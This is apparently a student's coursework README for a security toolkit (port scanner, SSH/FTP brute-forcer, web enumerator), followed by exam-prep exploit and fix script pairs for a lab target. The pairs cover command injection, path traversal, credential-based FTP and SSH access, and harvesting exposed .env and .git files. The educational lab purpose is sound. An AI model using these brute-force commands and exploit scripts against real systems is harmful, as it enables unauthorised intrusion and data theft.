markdown

# COM5413 Security Portfolio: The Benji Protocol
**Operator:** Harry Corcoran (01/04/2026)

## Toolkit Components
| Tool Name | Script | Purpose |
| :--- | :--- | :--- |
| **Evidence Collector** | `log_parser.py` |Parses `auth.log` for failed SSH/Login attempts. |
| **Network Cartographer** | `scan.py` |Multi-threaded TCP port scanner with banner grabbing. |
| **Access Validator** | `brute.py` |Targeted SSH/FTP credential tester with mandatory delay. |
| **Web Enumerator** | `web_enum.py` |Automated HTTP recon, header analysis, and comment scraping. |

## Operational Environment
* **Platform:** Linux (Ubuntu/Kali) or Windows (PowerShell)
* **Language:** Python 3.10+
* **No Manual Input:** All tools use `argparse` for automation; `input()` is prohibited

## Installation & Setup

Clone the repository and set up a virtual environment:

```bash
# Clone and enter repo
git clone https://github.com/harryc295/COM5413_Security_Portfolio
cd COM5413_Security_Portfolio

# Initialize Virtual Environment
python3 -m venv .venv
source .venv/bin/activate  # Linux / macOS
# .\.venv\Scripts\Activate.ps1 # PowerShell

Install the required dependencies:

pip install -r requirements.txt

requirements.txt contains:
txt

paramiko==3.4.0
requests==2.31.0
beautifulsoup4==4.12.3
pytest==8.0.0

Field Examples
1. The Evidence Collector (log_parser.py)
bash

# Linux
python3 toolkit/task1_evidence_collector/log_parser.py /var/log/auth.log --output suspects.csv

# PowerShell
python log_parser.py auth.log --output suspects.csv

2. The Network Cartographer (scan.py)
bash

# Linux (Range scan)
python3 toolkit/task2_network_scanner/scan.py 192.168.1.10 --ports 1-1024

# PowerShell (Specific ports)
python scan.py 10.0.0.5 --ports 21,22,80,443

3. The Access Validator (brute.py)
bash

# Linux (SSH)
python3 toolkit/task3_access_validator/brute.py 192.168.1.15 --service ssh --user root --wordlist /usr/share/wordlists/rockyou.txt

# PowerShell (FTP)
python brute.py 10.0.0.5 --service ftp --user admin --wordlist passwords.txt

4. The Web Enumerator (web_enum.py)
bash

# Linux (Standard Scan)
python3 toolkit/task4_web_enumerator/web_enum.py http://scanme.nmap.org --verbose

# PowerShell (Advanced Scan)
python web_enum.py http://10.10.10.5 --csv web_report.csv --paths "/config,/backup,/dev,/login

Build Log & AI Audit

    Build Log: docs/build.md – a notepad of all issues and challenges I had each week.

    AI Log: AI_LOG.md – logs of all AI that was used for debugging, etc.

Git Tags

There are tags at each milestone throughout this repository:

    w1 – Week 1: Evidence Collector

    w2 – Week 2: Network Cartographer

    w3 – Week 3: Access Validator

    w4 – Week 4: Web Enumerator

    hunt-final – Final submission after the Week 5 mission

Academic Integrity

All work is my own. Where AI was used (e.g., for debugging), it has been listed and documented within the university's AI policy and disability policy.

examples for the exam

1. Web: Command Injection (RCE)Use this if your Task 4 recon finds a page that takes a system command as a parameter.exploit.pyPythonimport requests

# URL found during Task 4 recon
target = "http://10.10.10.5/api/debug.php"
# Payload to 'cat' the flag file
payload = {'cmd': '; cat /root/flag.txt'} 

try:
    r = requests.get(target, params=payload, timeout=5)
    print(f"[+] Flag Result: {r.text.strip()}")
except Exception as e:
    print(f"[!] Error: {e}")
fix.pyPythonimport os

# Delete the vulnerable script entirely
path = "/var/www/html/api/debug.php"
if os.path.exists(path):
    os.remove(path)
    print("[+] Remediation: Vulnerable debug script deleted.")
2. Web: Local File Inclusion (LFI)Use this if a URL parameter like ?page= allows you to browse the server's files.exploit.pyPythonimport requests

# Use directory traversal to reach the root directory
target = "http://10.10.10.5/view.php"
params = {'file': '../../../../../../root/flag.txt'} 

r = requests.get(target, params=params)
if "flag{" in r.text.lower():
    print(f"[+] Flag Retrieved: {r.text.strip()}")
fix.pyPython# Create a whitelist patch for the PHP file
patch = """
$allowed = ['home.php', 'about.php', 'contact.php'];
if (!in_array($_GET['file'], $allowed)) {
    die('403 Forbidden: Access Denied');
}
"""
print("[+] Remediation: Implemented filename whitelisting for 'file' parameter.")
3. Network: FTP Brute Force AccessUse this if your Task 3 brute.py finds valid credentials for the FTP service.exploit.pyPythonfrom ftplib import FTP

host = "10.10.10.5"
user = "admin" # Credentials from your brute.py tool
pw = "password123" 

try:
    ftp = FTP(host)
    ftp.login(user, pw)
    
    # Download the flag
    with open('flag.txt', 'wb') as f:
        ftp.retrbinary('RETR flag.txt', f.write)
        
    with open('flag.txt', 'r') as f:
        print(f"[+] Flag Content: {f.read()}")
    ftp.quit()
except Exception as e:
    print(f"[-] FTP Login Failed: {e}")
fix.pyPythonimport os

# Change the password to something strong to stop the brute force
os.system("echo 'admin:Complex_Auth_2026_!!' | chpasswd")
# Restart the service to apply changes
os.system("systemctl restart vsftpd")
print("[+] Remediation: Updated compromised 'admin' password.")
4. Network: SSH Remote ExecutionUse this if your Task 3 brute.py finds valid SSH credentials.exploit.pyPythonimport paramiko # Requires paramiko in requirements.txt [cite: 113]

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

try:
    # Use credentials found during Week 3
    client.connect("10.10.10.5", username="benji", password="password1")
    stdin, stdout, stderr = client.exec_command("cat /home/benji/flag.txt")
    print(f"[+] Flag: {stdout.read().decode().strip()}")
    client.close()
except Exception as e:
    print(f"[!] SSH Error: {e}")
fix.pyPythonimport os

# Disable password login to force SSH keys only
config = "/etc/ssh/sshd_config"
os.system(f"sed -i 's/PasswordAuthentication yes/PasswordAuthentication no/' {config}")
os.system("systemctl restart ssh")
print("[+] Remediation: Disabled SSH password authentication.")
5. Recon: Information Leak (.env / Backups)Use this if your Task 4 recon finds sensitive files like .env or .git.exploit.pyPythonimport requests

# Common sensitive paths identified in the spec [cite: 57]
paths = ["/.env", "/config.php.bak", "/.git/config"]

for p in paths:
    r = requests.get(f"http://10.10.10.5{p}")
    if r.status_code == 200:
        print(f"[+] Sensitive Leak Found in {p}:")
        print(r.text) # Check this output for the Flag!
fix.pyPythonimport os

# Lock down the file permissions
target_file = "/var/www/html/.env"
if os.path.exists(target_file):
    os.chmod(target_file, 0o600) # Only root/owner can read
    print(f"[+] Remediation: Restricted permissions on {target_file}")

